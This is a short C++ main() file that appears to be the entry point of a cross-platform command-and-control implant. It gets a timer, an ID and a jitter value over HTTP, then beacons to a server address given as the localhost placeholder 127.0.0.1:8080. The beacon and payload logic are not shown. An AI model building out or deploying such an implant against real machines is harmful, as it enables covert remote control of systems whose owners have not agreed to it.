#include <iostream>
#include <string>
#include <tuple>
#include <stdexcept>
#include <curl/curl.h>

#include "Generic/httpRequests.h"

#ifdef __unix__
#include "Linux/generic.h"
#endif
#ifdef _WIN32
#include "Windows/generic.h"
#endif


int main() {
    try {
        auto result = httpConnection("127.0.0.1");
        int Timer = std::get<0>(result);
        std::string ID = std::get<1>(result);
        int Jitter = std::get<2>(result);
        beacon("127.0.0.1:8080", ID, Jitter, Timer);

    } catch (const std::exception& e) {
        std::cerr << "Failed to establish HTTP connection: " << e.what() << std::endl;
        return 1;
    }
    return 0;
}